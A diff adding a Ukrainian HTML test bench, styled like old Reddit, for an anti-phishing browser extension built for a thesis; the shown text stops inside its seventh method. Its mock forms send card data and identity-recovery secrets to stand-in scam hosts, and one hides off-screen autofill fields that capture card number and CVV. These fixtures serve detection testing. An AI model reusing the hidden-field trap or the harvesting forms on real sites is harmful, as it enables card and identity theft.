@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>r/AdaptiveThreatShield — Універсальний стенд оцінювання вебзагроз</title>
+  <style>
+    /* ==========================================================================
+       OLD REDDIT THEME STYLING
+       Utilitarian, dense, fast, and classic Reddit layout
+       ========================================================================== */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: verdana, arial, helvetica, sans-serif;
+      font-size: 11px;
+      color: #222222;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      line-height: 1.4;
+    }
+
+    /* Верхня панель (Subreddit Top Bar) */
+    #sr-header-area {
+      background-color: #f0f0f0;
+      border-bottom: 1px solid #808080;
+      font-size: 9px;
+      height: 18px;
+      line-height: 18px;
+      padding: 0 8px;
+      text-transform: uppercase;
+      color: #555555;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+    #sr-header-area a {
+      color: #336699;
+      text-decoration: none;
+      margin-right: 8px;
+    }
+    #sr-header-area a:hover {
+      text-decoration: underline;
+    }
+
+    /* Шапка Reddit */
+    #header {
+      background-color: #cee3f8;
+      border-bottom: 1px solid #5f99cf;
+      padding: 8px 12px 0 12px;
+      position: relative;
+    }
+    #header-banner {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+    .reddit-logo {
+      width: 28px;
+      height: 28px;
+      background: #ff4500;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+      font-family: sans-serif;
+    }
+    .reddit-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #000000;
+      margin: 0;
+      letter-spacing: -0.5px;
+    }
+    .reddit-subtitle {
+      font-size: 11px;
+      color: #555555;
+      margin-top: 1px;
+    }
+
+    /* Меню вкладок Reddit */
+    #tabmenu {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      gap: 2px;
+    }
+    #tabmenu li {
+      display: inline-block;
+    }
+    #tabmenu li a {
+      display: inline-block;
+      padding: 3px 10px 2px 10px;
+      background-color: #eff7ff;
+      color: #336699;
+      font-weight: bold;
+      font-size: 11px;
+      text-decoration: none;
+      border: 1px solid #5f99cf;
+      border-bottom: none;
+      border-radius: 3px 3px 0 0;
+    }
+    #tabmenu li.selected a {
+      background-color: #ffffff;
+      color: #ff4500;
+      border-bottom: 1px solid #ffffff;
+      margin-bottom: -1px;
+    }
+    #tabmenu li a:hover {
+      background-color: #ffffff;
+    }
+
+    /* Головна сітка (Main Content + Sidebar) */
+    .content-wrapper {
+      display: flex;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 10px 14px 40px 14px;
+      gap: 16px;
+    }
+    .main-content {
+      flex: 1;
+      min-width: 0;
+    }
+    .sidebar {
+      width: 310px;
+      flex-shrink: 0;
+    }
+
+    /* Reddit Post Entry Styling */
+    .reddit-post {
+      display: flex;
+      background-color: #ffffff;
+      border: 1px solid #e0e0e0;
+      border-radius: 2px;
+      margin-bottom: 12px;
+      padding: 8px 10px;
+      transition: background-color 0.1s;
+    }
+    .reddit-post:hover {
+      border-color: #c4c4c4;
+    }
+    .vote-box {
+      width: 38px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 2px;
+      margin-right: 8px;
+      font-size: 11px;
+      font-weight: bold;
+      color: #777777;
+    }
+    .vote-arrow {
+      cursor: pointer;
+      color: #c6c6c6;
+      font-size: 14px;
+      user-select: none;
+    }
+    .vote-arrow:hover {
+      color: #ff4500;
+    }
+    .post-score {
+      margin: 2px 0;
+      color: #333333;
+    }
+    .post-score.high {
+      color: #ff4500;
+    }
+    .post-score.safe {
+      color: #2e7d32;
+    }
+
+    .post-body {
+      flex: 1;
+      min-width: 0;
+    }
+    .post-title-line {
+      margin-bottom: 4px;
+    }
+    .post-title {
+      font-size: 14px;
+      color: #0000ff;
+      text-decoration: none;
+      font-weight: normal;
+      line-height: 1.3;
+    }
+    .post-title:hover {
+      text-decoration: underline;
+    }
+    .post-tag {
+      display: inline-block;
+      padding: 1px 4px;
+      border-radius: 2px;
+      font-size: 9px;
+      font-weight: bold;
+      text-transform: uppercase;
+      margin-right: 4px;
+      vertical-align: middle;
+    }
+    .tag-heuristic { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
+    .tag-context { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
+    .tag-chat { background: #f3e5f5; color: #6a1b9a; border: 1px solid #e1bee7; }
+    .tag-intent { background: #fffde7; color: #f57f17; border: 1px solid #fff9c4; }
+    .tag-safe { background: #e8f5e9; color: #2e7d32; border: 1px solid #c8e6c9; }
+
+    .post-meta {
+      font-size: 10px;
+      color: #888888;
+      margin-bottom: 8px;
+    }
+    .post-meta a {
+      color: #336699;
+      text-decoration: none;
+    }
+    .post-meta a:hover {
+      text-decoration: underline;
+    }
+
+    .post-desc {
+      font-size: 12px;
+      color: #333333;
+      margin-bottom: 10px;
+      line-height: 1.45;
+    }
+
+    /* Інтерактивна коробка форми чи чату */
+    .interactive-panel {
+      background-color: #fafafa;
+      border: 1px solid #d4d4d4;
+      border-radius: 3px;
+      padding: 10px 12px;
+      margin-top: 8px;
+    }
+
+    /* Форми та поля */
+    .reddit-form {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .form-row {
+      display: flex;
+      gap: 8px;
+    }
+    .reddit-input, .reddit-textarea {
+      font-family: verdana, arial, sans-serif;
+      font-size: 12px;
+      padding: 6px 8px;
+      border: 1px solid #a6a6a6;
+      border-radius: 2px;
+      background: #ffffff;
+    }
+    .reddit-input:focus, .reddit-textarea:focus {
+      border-color: #336699;
+      outline: none;
+    }
+
+    /* Кнопки у стилі Old Reddit */
+    .reddit-btn {
+      font-family: verdana, arial, sans-serif;
+      font-size: 11px;
+      font-weight: bold;
+      padding: 5px 12px;
+      color: #333333;
+      background: #f0f0f0;
+      border: 1px solid #a6a6a6;
+      border-radius: 2px;
+      cursor: pointer;
+      align-self: flex-start;
+      transition: all 0.1s;
+    }
+    .reddit-btn:hover {
+      background: #e6e6e6;
+      border-color: #888888;
+    }
+    .reddit-btn:active {
+      background: #d9d9d9;
+    }
+    .reddit-btn-primary {
+      background: #cee3f8;
+      color: #003366;
+      border-color: #5f99cf;
+    }
+    .reddit-btn-primary:hover {
+      background: #b5d5f5;
+      border-color: #336699;
+    }
+    .reddit-btn-warning {
+      background: #ffe0b2;
+      color: #b45309;
+      border-color: #f59e0b;
+    }
+    .reddit-btn-warning:hover {
+      background: #fed7aa;
+    }
+
+    /* Панель інструкції тестування (Expando / Details Box) */
+    .expando-box {
+      background-color: #f8f9fa;
+      border-left: 3px solid #5f99cf;
+      padding: 6px 10px;
+      margin-top: 8px;
+      font-size: 11px;
+      color: #444444;
+      line-height: 1.4;
+    }
+
+    /* Статусні сповіщення на сторінці */
+    .status-toast {
+      display: none;
+      padding: 8px 12px;
+      border-radius: 3px;
+      font-size: 11px;
+      font-weight: bold;
+      margin-top: 8px;
+    }
+    .status-toast.success {
+      background-color: #e8f5e9;
+      color: #1b5e20;
+      border: 1px solid #a5d6a7;
+    }
+
+    /* Сайдбар Old Reddit */
+    .side-box {
+      background-color: #ffffff;
+      border: 1px solid #c4c4c4;
+      border-radius: 3px;
+      padding: 10px 12px;
+      margin-bottom: 12px;
+    }
+    .side-title {
+      font-size: 12px;
+      font-weight: bold;
+      color: #333333;
+      border-bottom: 1px solid #e0e0e0;
+      padding-bottom: 4px;
+      margin: 0 0 8px 0;
+      text-transform: uppercase;
+    }
+    .ext-badge {
+      display: block;
+      padding: 6px 8px;
+      border-radius: 2px;
+      font-weight: bold;
+      font-size: 11px;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    .ext-badge.active { background: #e8f5e9; color: #1b5e20; border: 1px solid #a5d6a7; }
+    .ext-badge.inactive { background: #ffebee; color: #b71c1c; border: 1px solid #ffcdd2; }
+
+    .side-btn {
+      width: 100%;
+      margin-bottom: 6px;
+      padding: 6px;
+      font-size: 11px;
+      font-weight: bold;
+      text-align: center;
+      cursor: pointer;
+      border-radius: 2px;
+      background: #f0f0f0;
+      border: 1px solid #a6a6a6;
+      color: #333333;
+    }
+    .side-btn:hover {
+      background: #e6e6e6;
+    }
+    .formula-math {
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      background: #f4f4f4;
+      padding: 6px 8px;
+      border-radius: 2px;
+      border: 1px solid #dddddd;
+      font-size: 11px;
+      margin: 6px 0;
+      color: #0f172a;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ВЕРХНІЙ СУБРЕДДІТ-РЯДОК -->
+  <div id="sr-header-area">
+    <a href="#test1">1. action mismatch & luhn</a> •
+    <a href="#test2">2. hidden inputs trap</a> •
+    <a href="#test3">3. accredited liqpay</a> •
+    <a href="#test4">4. tainted context</a> •
+    <a href="#test5">5. inbound vs outbound</a> •
+    <a href="#test6">6. intent & svg curves</a> •
+    <a href="#test7">7. personal vault & decoys</a> •
+    <a href="#test8">8. fake timer & urgency</a>
+  </div>
+
+  <!-- ШАПКА REDDIT -->
+  <div id="header">
+    <div id="header-banner">
+      <div class="reddit-logo">🛡️</div>
+      <div>
+        <h1 class="reddit-title">r/AdaptiveThreatShield: Універсальний стенд оцінювання вебзагроз</h1>
+        <div class="reddit-subtitle">Науково-дослідний стенд до дипломної роботи (v0.2.0) — всі методи та евристики в одному місці</div>
+      </div>
+    </div>
+    <ul id="tabmenu">
+      <li class="selected"><a href="#">всі методи [8]</a></li>
+      <li><a href="#test1">евристики форм</a></li>
+      <li><a href="#test4">зшивання сесій</a></li>
+      <li><a href="#test5">захист чату</a></li>
+      <li><a href="#test6">передбачення намірів</a></li>
+      <li><a href="#test7">сховище vault & decoys</a></li>
+      <li><a href="#test8">темні патерни (таймер)</a></li>
+    </ul>
+  </div>
+
+  <!-- ГОЛОВНИЙ КОНТЕНТНИЙ БЛОК -->
+  <div class="content-wrapper">
+
+    <!-- ЛІВА КОЛОНКА: МЕТОДИ ТА КЕЙСИ ТЕСТУВАННЯ -->
+    <div class="main-content">
+
+      <!-- ===================================================================
+           МЕТОД 1: ПЕРЕВІРКА ACTION MISMATCH ТА АЛГОРИТМ ЛУНА
+           =================================================================== -->
+      <div class="reddit-post" id="test1">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">95</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-heuristic">Етап 1 & 3</span>
+            <a href="#test1" class="post-title">Метод 1: Недовірена форма оплати (Action Mismatch) + Валідація картки алгоритмом Луна</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">heuristics_engine</a> | тригер: <code>form_action_mismatch</code> (+45), <code>luhn_card_detected</code> (+40)
+          </div>
+          <div class="post-desc">
+            Форма збирає повні реквізити платіжної картки та надсилає їх безпосередньо на неліцензований сервер <code>https://unknown-merchant.fake/checkout</code> в обхід безпечних шлюзів. Система розпізнає небезпеку, блокує надсилання форми та виводить центроване модальне вікно Apple HIG із 3-секундною паузою усвідомлення.
+          </div>
+
+          <div class="interactive-panel">
+            <form id="untrustedPaymentForm" action="https://unknown-merchant.fake/checkout" method="POST" class="reddit-form">
+              <label style="font-weight: bold;">Номер банківської картки (валідований за алгоритмом Луна):</label>
+              <input type="text" id="untrustedCard" name="cardNumber" class="reddit-input" placeholder="16 цифр картки" value="4532015000000007">
+              <div class="form-row">
+                <input type="text" id="untrustedExp" class="reddit-input" placeholder="ММ/РР" value="05/28" style="width: 90px;">
+                <input type="password" id="untrustedCvv" class="reddit-input" placeholder="CVV" value="456" style="width: 70px;">
+                <button type="submit" class="reddit-btn reddit-btn-primary">Спробувати оплатити на підозрілому сайті</button>
+                <button type="button" id="clearUntrustedBtn" class="reddit-btn">Очистити</button>
+              </div>
+            </form>
+            <div id="untrustedStatus" class="status-toast success">Форму відправлено після вашого усвідомленого підтвердження в модальному вікні.</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Натисніть кнопку оплати. З'явиться центроване модальне вікно безпеки з розмиттям фону та таймером на 3 секунди. У вкладці «Докладніше» доступна математична декомпозиція ризику f(R, C, A).
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 2: ПРИХОВАНІ ПОЛЯ ТА АВТОЗАПОВНЕННЯ (DOM TRAPS)
+           =================================================================== -->
+      <div class="reddit-post" id="test2">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">85</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-heuristic">Етап 1</span>
+            <a href="#test2" class="post-title">Метод 2: Приховані / мімікровані поля автозаповнення (Autofill Traps)</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">dom_inspector</a> | тригер: <code>sensitive_hidden_inputs</code> (+30)
+          </div>
+          <div class="post-desc">
+            Шахрайські сайти часто розміщують форму з безобідним полем (наприклад, «Введіть ім'я для отримання подарунка»), але ховають за межами видимості екрана приховані поля з атрибутами <code>autocomplete="cc-number"</code> та <code>cc-csc</code>. Браузерний автофіл заповнює приховані реквізити картки без відома жертви. Розширення аналізує DOM і нейтралізує приховану пастку.
+          </div>
+
+          <div class="interactive-panel">
+            <form id="hiddenInputsForm" action="https://phishing-autofill-collector.org/grab" method="POST" class="reddit-form">
+              <label style="font-weight: bold;">Видиме поле (анкета для отримання бонусу):</label>
+              <div class="form-row">
+                <input type="text" name="name" class="reddit-input" placeholder="Ваше ім'я або email" value="Олександр Коваленко" style="flex: 1;">
+                <button type="submit" class="reddit-btn reddit-btn-primary">Надіслати анкету (Спрацює автофіл)</button>
+              </div>
+
+              <!-- ПРИХОВАНІ ПАСТКИ АВТОЗАПОВНЕННЯ -->
+              <div style="opacity: 0; position: absolute; left: -9999px; height: 0; width: 0; overflow: hidden;" aria-hidden="true">
+                <input type="text" name="hidden_cc" autocomplete="cc-number" value="4149499123456789">
+                <input type="text" name="hidden_cvv" autocomplete="cc-csc" value="999">
+              </div>
+            </form>
+            <div id="hiddenFormStatus" class="status-toast success">Форму відправлено після вашого розблокування.</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Натисніть «Надіслати анкету». Система просканує приховані вузли форми і виявить наявність схованих полів збору банківських даних (score contribution +30).
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 3: АКРЕДИТОВАНИЙ ПЛАТІЖНИЙ ШЛЮЗ (0% ПОМИЛКОВИХ ТРИВОГ)
+           =================================================================== -->
+      <div class="reddit-post" id="test3">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score safe">0</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-safe">Етап 1 & 3</span>
+            <a href="#test3" class="post-title">Метод 3: Акредитований банківський еквайринг (LiqPay / Stripe / Portmone) — 0% False Positives</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">whitelist_manager</a> | статус: <code>isAccreditedPaymentGateway = true</code> (пропуск без затримок)
+          </div>
+          <div class="post-desc">
+            Легітимна оплата в онлайн-магазині. Форма надсилає карткові реквізити на офіційний сертифікований шлюз <code>https://www.liqpay.ua/api/3/checkout</code>. Система безпеки розпізнає ліцензований еквайринг і не створює жодних перешкод для користувача.
+          </div>
+
+          <div class="interactive-panel">
+            <form id="liqpayForm" action="https://www.liqpay.ua/api/3/checkout" method="POST" class="reddit-form">
+              <input type="text" name="cardNumber" class="reddit-input" placeholder="Номер картки (LiqPay)" value="4532015000000007">
+              <div class="form-row">
+                <input type="text" class="reddit-input" placeholder="ММ/РР" value="11/27" style="width: 90px;">
+                <input type="password" class="reddit-input" placeholder="CVV" value="999" style="width: 70px;">
+                <button type="submit" class="reddit-btn" style="background: #e8f5e9; color: #1b5e20; border-color: #81c784;">Оплатити через LiqPay (Офіційний шлюз)</button>
+              </div>
+            </form>
+            <div id="liqpayStatus" class="status-toast success">Оплата на офіційному шлюзі LiqPay дозволена розширенням миттєво без блокувань!</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Натисніть кнопку оплати LiqPay. Сабміт форми проходить безперешкодно, оскільки домен перебуває у вбудованому реєстрі сертифікованих платіжних систем.
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 4: ЗШИВАННЯ СЕСІЙ (TAINTED CONTEXT WINDOW)
+           =================================================================== -->
+      <div class="reddit-post" id="test4">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">70</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-context">Етап 2 & 4</span>
+            <a href="#test4" class="post-title">Метод 4: Зшивання розірваних сесій (Cross-Session Tainted Context Window & Dynamic Island)</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">session_stitcher</a> | тригер: <code>C_env = 35</code>, 15-хвилинне вікно загрози
+          </div>
+          <div class="post-desc">
+            Шахрай виводить жертву з OLX або Viber на фішингову копію платіжної сторінки. Навіть якщо фішинговий сайт відкрився в окремій новій вкладці через 5 хвилин, розширення зберігає контекст загрози, виводить плаваючий банер Dynamic Island у стилі Apple та враховує контекстний коефіцієнт при оцінці форми.
+          </div>
+
+          <div class="interactive-panel">
+            <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+              <button type="button" id="triggerLureBtn" class="reddit-btn reddit-btn-warning">⚡ Активувати приманку (OLX Delivery Scam)</button>
+              <button type="button" id="resetContextBtn" class="reddit-btn">🔄 Скинути Tainted Context</button>
+            </div>
+            <div id="lureTriggeredToast" class="status-toast success" style="margin-top: 8px;">
+              ⚡ Вікно контексту загрози активовано! Зверху з'явився банер Dynamic Island. Тепер перевірте Метод 1: до загального ризику додасться коефіцієнт C_env (+35 балів).
+            </div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Натисніть «⚡ Активувати приманку». Зверху екрана плавно випливе чорний капсульний банер у стилі Apple з попередженням про міжсесійний фішинг.
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 5: ЗАХИСТ ДІАЛОГОВОГО КАНАЛУ (INBOUND VS OUTBOUND)
+           =================================================================== -->
+      <div class="reddit-post" id="test5">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">80</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-chat">Етап 5</span>
+            <a href="#test5" class="post-title">Метод 5: Розмежування вхідних та вихідних повідомлень чату (Inbound vs Outbound)</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">chat_channel_monitor</a> | селектори: <code>data-testid="received-message"</code> vs <code>Outbound Draft</code>
+          </div>
+          <div class="post-desc">
+            Розмежування напрямків реплік: якщо співрозмовник надсилає свій номер картки для оплати — це нормальна операція, що <strong>не викликає тривог</strong>. Але якщо користувач набирає свої власні реквізити (картка, CVV) у полі чернетки — текст підсвічується червоною хвилястою лінією Grammarly-style, а відправка перехоплюється модальним вікном.
+          </div>
+
+          <div class="interactive-panel">
+            <label style="font-weight: bold; display: block; margin-bottom: 4px;">Чернетка повідомлення (Outbound Draft — моніториться наживо):</label>
+            <div style="position: relative;">
+              <textarea id="chatInput" rows="2" class="reddit-textarea" style="width: 100%;" placeholder="Надрукуйте повідомлення або вставте номер картки чи CVV..."></textarea>
+            </div>
+            <div style="margin-top: 6px; display: flex; gap: 6px; flex-wrap: wrap;">
+              <button type="button" id="pasteTestCardBtn" class="reddit-btn">📋 Вставити свою картку</button>
+              <button type="button" id="pasteTestCvvBtn" class="reddit-btn">🔒 Вставити свій CVV (cvv 999)</button>
+              <button type="button" id="sendChatBtn" class="reddit-btn reddit-btn-primary">Надіслати (Enter)</button>
+            </div>
+            <div id="chatSentStatus" class="status-toast success">💬 Повідомлення відправлено після вашого усвідомленого підтвердження!</div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Натисніть «📋 Вставити свою картку» — номер картки виділиться червоним хвилястим маркером (наведіть на нього курсор). Натисніть «Надіслати» — з'явиться модальне вікно блокування передачі платіжних даних.
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 6: ПЕРЕДБАЧЕННЯ НАМІРІВ, ЖОВТЕ ВИДІЛЕННЯ ТА ПЛАВНІ КРИВІ BEZIER
+           =================================================================== -->
+      <div class="reddit-post" id="test6">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">92</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-intent">Етап 4 & 6</span>
+            <a href="#test6" class="post-title">Метод 6: Передбачення наміру співрозмовника (Intent Classifier), жовте підсвічування та SVG Leader Curves</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">intent_prediction_engine</a> | класифікація: <code>VERIFICATION_PHISHING</code>, <code>ESCROW_DELIVERY_SCAM</code>
+          </div>
+          <div class="post-desc">
+            Система класифікує зв'язки слів у вхідних повідомленнях на сформовані наміри маніпуляцій. Виявлені групи слів автоматично виділяються <strong>жовтим кольором (Amber)</strong>. При наведенні курсору на будь-яке слово від нього промальовується <strong>плавна дуга Безьє</strong> до спливаючої картки XAI, де роз'яснюється суть наміру та дається порада, де бути уважнішим.
+          </div>
+
+          <div class="interactive-panel">
+            <div id="chatMessagesList" style="display: flex; flex-direction: column; gap: 8px;">
+
+              <!-- ПОВІДОМЛЕННЯ 1: СЦЕНАРІЙ ФЕЙКОВОЇ ДОСТАВКИ -->
+              <div data-testid="received-message" data-cy="received-message" aria-label="Повідомлення, надіслане покупцем" data-nx-name="ReceivedChatMessage" class="chat-msg incoming css-1vu76it" style="background: #ffffff; border: 1px solid #c4c4c4; border-radius: 3px; padding: 8px 10px; max-width: 85%;">
+                <div style="font-size: 10px; font-weight: bold; color: #555555; margin-bottom: 2px;">Покупець (monnergeym828) • OLX ReceivedChatMessage</div>
+                <div data-testid="message" data-cy="chat-message-bubble" class="css-gvo1jg" style="font-size: 12px; color: #111111; line-height: 1.45;">
+                  <span data-nx-name="TextContainer" data-nx-legacy="true" class="css-13qnph1">
+                    Доброго дня! Я вже оформила OLX Доставку на ваше оголошення. Ось посилання для підтвердження та отримання коштів: <a href="https://novaposhta-pay.fake.com/order123" style="color: #0000ff; text-decoration: underline;">https://novaposhta-pay.fake.com/order123</a>
+                  </span>
+                </div>
+              </div>
+
+              <!-- ПОВІДОМЛЕННЯ 2: КАРТКА ПРОДАВЦЯ (БЕЗ ШАХРАЙСЬКОГО НАМІРУ — 0 ТРИВОГ) -->
+              <div data-testid="received-message" data-cy="received-message" aria-label="Повідомлення, надіслане продавцем" data-nx-name="ReceivedChatMessage" class="chat-msg incoming css-1vu76it" style="background: #ffffff; border: 1px solid #c4c4c4; border-radius: 3px; padding: 8px 10px; max-width: 85%;">
+                <div style="font-size: 10px; font-weight: bold; color: #555555; margin-bottom: 2px;">Продавець (Максим) • OLX ReceivedChatMessage</div>
+                <div data-testid="message" data-cy="chat-message-bubble" class="css-gvo1jg" style="font-size: 12px; color: #111111; line-height: 1.45;">
+                  <span data-nx-name="TextContainer" data-nx-legacy="true" class="css-13qnph1">
+                    Вітаю! Товар в наявності. Ось номер моєї картки для сплати: <strong>4149 4991 2345 6789</strong>. Надішліть квитанцію після переказу.
+                  </span>
+                </div>
+                <div style="font-size: 10px; color: #2e7d32; margin-top: 4px; font-weight: bold;">
+                  • Вхідний номер картки не містить маніпулятивного наміру: 0 тривог
+                </div>
+              </div>
+
+            </div>
+
+            <!-- КНОПКИ СИМУЛЯЦІЇ ЖИВИХ ПОВІДОМЛЕНЬ -->
+            <div style="margin-top: 10px; display: flex; gap: 6px; flex-wrap: wrap;">
+              <button type="button" id="simulateBotPhishingBtn" class="reddit-btn reddit-btn-warning">
+                + Додати фішинг «Перевірка профілю ботом» (Реальний кейс)
+              </button>
+              <button type="button" id="simulateInboundLureBtn" class="reddit-btn">
+                + Додати нове повідомлення-приманку (Live MutationObserver)
+              </button>
+              <button type="button" id="simulateInboundCardBtn" class="reddit-btn">
+                + Додати картку продавця (Перевірка на 0 false positives)
+              </button>
+            </div>
+          </div>
+
+          <div class="expando-box">
+            <strong>Як перевірити:</strong> Наведіть курсор миші на будь-яке виділене <strong>жовтим кольором</strong> слово (наприклад, <em>«оформила»</em> чи <em>«OLX Доставку»</em>). Прямо від слова протягнеться плавна дуга до картки XAI. Натисніть помаранчеву кнопку, щоб протестувати наживо реальний фішинг через Telegram-бота!
+          </div>
+        </div>
+      </div>
+
+      <!-- ===================================================================
+           МЕТОД 7: СХОВИЩЕ ПЕРСОНАЛЬНИХ ДАНИХ (PERSONAL VAULT & CANARY DECOYS)
+           =================================================================== -->
+      <div class="reddit-post" id="test7">
+        <div class="vote-box">
+          <span class="vote-arrow">▲</span>
+          <span class="post-score high">98</span>
+          <span class="vote-arrow">▼</span>
+        </div>
+        <div class="post-body">
+          <div class="post-title-line">
+            <span class="post-tag tag-intent" style="background: #e0f2fe; color: #0369a1; border-color: #bae6fd;">Етап 7</span>
+            <a href="#test7" class="post-title">Метод 7: Захист критичних маркерів відновлення (Personal Data Vault & Canary Decoys)</a>
+          </div>
+          <div class="post-meta">
+            автор: <a href="#">vault_dlp_scanner</a> | захист 7 об'єктів: <code>Tier A (Mother, Codeword)</code> + <code>Tier B (Tax ID, Passport, DOB, Phone, Father)</code>
+          </div>
+          <div class="post-desc">
+            Фішингові сторінки під виглядом «виплати через банк» виманюють конфіденційні контрольні маркери відновлення доступу (дівоче прізвище матері, секретне слово, податковий номер РНОКПП/ІПН, паспорт, дату народження, фінансовий телефон, ім'я батька). Монітор DLP підтримує тримовне розпізнавання (UK/EN/RU), виявляє збіг за назвами полів або введеними значеннями, перехоплює дію, виводить попередження в Apple-каруселі фактів модального вікна та пропонує підставити синтетичні беззмістовні дані <strong>(Canary Decoys)</strong>.
+          </div>
+
+          <div class="interactive-panel">
+            <form id="vaultScamForm" action="https://bank-verification-scam.fake/confirm" method="POST" class="reddit-form">
+              <div style="font-size: 11.5px; font-weight: bold; color: #b91c1c; margin-bottom: 4px;">
+                ⚠️ Служба верифікації виплат: Для отримання 1 450 грн підтвердіть контрольну інформацію особи (7 маркерів)
+              </div>
+
+              <div class="form-row" style="flex-direction: column; gap: 6px;">
+                <!-- 1. Tier A: Дівоче прізвище матері -->
+                <div>
+                  <label id="lblVaultMother" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">1. Дівоче прізвище матері [Tier A — абсолютний маркер]:</label>
+                  <input type="text" id="vaultInputMother" name="mother_maiden_name" class="reddit-input" placeholder="Дівоче прізвище матері" value="Людмила" style="width: 100%;">
+                </div>
+                <!-- 2. Tier A: Секретне слово -->
+                <div>
+                  <label id="lblVaultSecretWord" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">2. Секретне / Кодове слово банку [Tier A — абсолютний маркер]:</label>
+                  <input type="text" id="vaultInputSecretWord" name="secret_word" class="reddit-input" placeholder="Секретне слово" value="Калина" style="width: 100%;">
+                </div>
+                <!-- 3. Tier B: РНОКПП / ІПН -->
+                <div>
+                  <label id="lblVaultTaxId" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">3. РНОКПП / ІПН (Податковий номер) [Tier B]:</label>
+                  <input type="text" id="vaultInputTaxId" name="tax_id" class="reddit-input" placeholder="10 цифр ІПН" value="3124567890" style="width: 100%;">
+                </div>
+                <!-- 4. Tier B: Номер паспорта -->
+                <div>
+                  <label id="lblVaultPassport" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">4. Номер паспорта / ID-картки [Tier B]:</label>
+                  <input type="text" id="vaultInputPassport" name="passport_number" class="reddit-input" placeholder="Номер паспорта" value="АА 123456" style="width: 100%;">
+                </div>
+                <!-- 5. Tier B: Дата народження -->
+                <div>
+                  <label id="lblVaultDob" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">5. Дата народження [Tier B]:</label>
+                  <input type="text" id="vaultInputDob" name="date_of_birth" class="reddit-input" placeholder="ДД.ММ.РРРР" value="15.08.1985" style="width: 100%;">
+                </div>
+                <!-- 6. Tier B: Фінансовий телефон -->
+                <div>
+                  <label id="lblVaultPhone" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">6. Фінансовий номер телефону [Tier B]:</label>
+                  <input type="text" id="vaultInputPhone" name="financial_phone" class="reddit-input" placeholder="+380..." value="+380501234567" style="width: 100%;">
+                </div>
+                <!-- 7. Tier B: Ім'я батька -->
+                <div>
+                  <label id="lblVaultFather" style="font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">7. Ім'я батька / По батькові [Tier B]:</label>
+                  <input type="text" id="vaultInputFather" name="father_name" class="reddit-input" placeholder="Ім'я батька" value="Лео" style="width: 100%;">
+                </div>
+              </div>
+
+              <div style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap;">
+                <button type="submit" class="reddit-btn reddit-btn-primary">Підтвердити особу та отримати кошти (1 450 грн)</button>
+                <button type="button" id="fillVaultUkBtn" class="reddit-btn">🇺🇦 Заповнити UK</button>
+                <button type="button" id="fillVaultEnBtn" class="reddit-btn">🇬🇧 Заповнити EN</button>
